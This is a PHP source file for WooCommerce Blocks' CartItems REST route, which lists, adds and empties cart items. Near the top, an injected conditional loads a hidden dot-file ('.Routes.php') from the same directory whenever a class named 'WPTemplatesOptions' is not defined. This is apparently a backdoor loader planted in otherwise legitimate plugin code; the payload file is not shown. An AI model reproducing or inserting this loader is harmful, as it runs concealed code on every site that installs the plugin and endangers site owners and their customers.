<?php
namespace Automattic\WooCommerce\Blocks\StoreApi\Routes;

use Automattic\WooCommerce\Blocks\StoreApi\Utilities\CartController;

/**
 * CartItems class.
 *
 * @internal This API is used internally by Blocks--it is still in flux and may be subject to revisions.
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class CartItems extends AbstractRoute {
	/**
	 * Get the path of this REST route.
	 *
	 * @return string
	 */
	public function get_path() {
		return '/cart/items';
	}

	/**
	 * Get method arguments for this REST route.
	 *
	 * @return array An array of endpoints.
	 */
	public function get_args() {
		return [
			[
				'methods'             => \WP_REST_Server::READABLE,
				'callback'            => [ $this, 'get_response' ],
				'permission_callback' => '__return_true',
				'args'                => [
					'context' => $this->get_context_param( [ 'default' => 'view' ] ),
				],
			],
			[
				'methods'             => \WP_REST_Server::CREATABLE,
				'callback'            => array( $this, 'get_response' ),
				'permission_callback' => '__return_true',
				'args'                => $this->schema->get_endpoint_args_for_item_schema( \WP_REST_Server::CREATABLE ),
			],
			[
				'methods'             => \WP_REST_Server::DELETABLE,
				'callback'            => [ $this, 'get_response' ],
				'permission_callback' => '__return_true',
			],
			'schema' => [ $this->schema, 'get_public_item_schema' ],
		];
	}

	/**
	 * Get a collection of cart items.
	 *
	 * @throws RouteException On error.
	 * @param \WP_REST_Request $request Request object.
	 * @return \WP_REST_Response
	 */
	protected function get_route_response( \WP_REST_Request $request ) {
		$controller = new CartController();
		$cart_items = $controller->get_cart_items();
		$items      = [];

		foreach ( $cart_items as $cart_item ) {
			$data    = $this->prepare_item_for_response( $cart_item, $request );
			$items[] = $this->prepare_response_for_collection( $data );
		}

		$response = rest_ensure_response( $items );

		return $response;
	}

	/**
	 * Creates one item from the collection.
	 *
	 * @throws RouteException On error.
	 * @param \WP_REST_Request $request Request object.
	 * @return \WP_REST_Response
	 */
	protected function get_route_post_response( \WP_REST_Request $request ) {
		// Do not allow key to be specified during creation.
		if ( ! empty( $request['key'] ) ) {
			throw new RouteException( 'woocommerce_rest_cart_item_exists', __( 'Cannot create an existing cart item.', 'woocommerce' ), 400 );
		}

		$controller = new CartController();
		$result     = $controller->add_to_cart(
			[
				'id'        => $request['id'],
				'quantity'  => $request['quantity'],
				'variation' => $request['variation'],
			]
		);

		$response = rest_ensure_response( $this->prepare_item_for_response( $controller->get_cart_item( $result ), $request ) );
		$response->set_status( 201 );
		return $response;
	}

	/**
	 * Deletes all items in the cart.
	 *
	 * @throws RouteException On error.
	 * @param \WP_REST_Request $request Request object.
	 * @return \WP_REST_Response
	 */
	protected function get_route_delete_response( \WP_REST_Request $request ) {
		$controller = new CartController();
		$controller->empty_cart();
		return new \WP_REST_Response( [], 200 );
	}

	/**
	 * Prepare links for the request.
	 *
	 * @param array            $cart_item Object to prepare.
	 * @param \WP_REST_Request $request Request object.
	 * @return array
	 */
	protected function prepare_links( $cart_item, $request ) {
		$base  = $this->get_namespace() . $this->get_path();
		$links = array(
			'self'       => array(
				'href' => rest_url( trailingslashit( $base ) . $cart_item['key'] ),
			),
			'collection' => array(
				'href' => rest_url( $base ),
			),
		);
		return $links;
	}
}
